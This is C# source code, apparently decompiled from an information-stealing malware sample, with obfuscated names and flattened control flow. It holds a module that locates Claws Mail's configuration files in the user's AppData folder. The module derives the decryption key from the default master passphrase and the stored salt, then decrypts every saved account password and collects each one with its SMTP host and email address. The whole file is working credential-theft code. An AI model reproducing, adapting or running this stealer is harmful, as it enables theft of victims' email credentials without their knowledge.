using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using _81d;
using p3N5Y;

namespace ZAZUx;

public class WnRNxU : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string SOgQbvr
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public WnRNxU()
	{
		SOgQbvr = "ClawsMail";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		string text = default;
		while (true)
		{
			if (num != 5)
			{
				if (num == 1)
				{
					list = new List<ii68>();
					num = 2;
				}
				if (num == 4)
				{
					if (File.Exists(text + "\\clawsrc"))
					{
						break;
					}
					num = 5;
				}
				if (num == 3)
				{
					if (!Directory.Exists(text))
					{
						goto IL_001f;
					}
					num = 4;
				}
				if (num == 2)
				{
					text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Claws-mail";
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 6)
				{
					break;
				}
				continue;
			}
			goto IL_001f;
			IL_001f:
			return list;
		}
		string input = File.ReadAllText(text + "\\clawsrc");
		string teH = "passkey0";
		string value = new Regex("master_passphrase_salt=(.+)").Match(input).Groups[1].Value;
		string value2 = new Regex("master_passphrase_pbkdf2_rounds=(.+)").Match(input).Groups[1].Value;
		kKdeGISe kKdeGISe2 = new kKdeGISe(text + "\\accountrc");
		Dictionary<string, ii68> dictionary = new Dictionary<string, ii68>();
		foreach (string key in kKdeGISe2.Keys)
		{
			string host = kKdeGISe2[key]["smtp_server"];
			string username = kKdeGISe2[key]["address"];
			ii68 ii69 = new ii68();
			ii69.byIdLuuGZbL = host;
			ii69.S8v = username;
			ii68 value3 = ii69;
			if (key.ToLower().StartsWith("account"))
			{
				dictionary.Add("[" + key.ToLower().Replace(" ", "") + "]", value3);
			}
		}
		string[] array = File.ReadAllLines(text + "\\passwordstorerc");
		for (int i = 0; i <= array.Length - 1; i++)
		{
			foreach (string key2 in dictionary.Keys)
			{
				if (key2 == array[i])
				{
					string value4 = new Regex("{(.*),(.*)}(.*)").Match(array[i + 1]).Groups[3].Value;
					byte[] jvbqeRvZGRc = _0zXBjkXwDH(teH, Convert.FromBase64String(value), Convert.ToInt32(value2), 32);
					ii68 ii70 = dictionary[key2];
					string text2 = SZaULea(Convert.FromBase64String(value4), jvbqeRvZGRc);
					char[] trimChars = new char[1];
					ii70._9H5rP7hg2 = text2.Trim(trimChars);
				}
			}
		}
		foreach (ii68 value5 in dictionary.Values)
		{
			if (value5._9H5rP7hg2.Length > 1)
			{
				list.Add(new ii68
				{
					byIdLuuGZbL = value5.byIdLuuGZbL,
					S8v = value5.S8v,
					_9H5rP7hg2 = value5._9H5rP7hg2,
					oVAe = SOgQbvr
				});
			}
		}
		return list;
	}

	private static string SZaULea(byte[] pdaO, byte[] JvbqeRvZGRc)
	{
		int num = 0;
		byte[] rgbIV = default;
		byte[] array = default;
		do
		{
			if (num == 2)
			{
				rgbIV = array;
				num = 3;
			}
			if (num == 1)
			{
				array = new byte[16];
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Padding = PaddingMode.None;
			rijndaelManaged.Mode = CipherMode.CBC;
			RijndaelManaged rijndaelManaged2 = rijndaelManaged;
			ICryptoTransform cryptoTransform = rijndaelManaged2.CreateDecryptor(JvbqeRvZGRc, rgbIV);
			string text = Encoding.UTF8.GetString(cryptoTransform.TransformFinalBlock(pdaO, 0, pdaO.Length));
			return text.Substring(16);
		}
		catch
		{
			return null;
		}
	}

	private static byte[] _0zXBjkXwDH(string teH, byte[] _4LeB, int HpQg5FRa, int ELI8)
	{
		int num = 0;
		Rfc2898DeriveBytes rfc2898DeriveBytes = default;
		do
		{
			if (num == 2)
			{
				rfc2898DeriveBytes.IterationCount = HpQg5FRa;
				num = 3;
			}
			if (num == 1)
			{
				rfc2898DeriveBytes = new Rfc2898DeriveBytes(teH, _4LeB);
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		return rfc2898DeriveBytes.GetBytes(ELI8);
	}
}
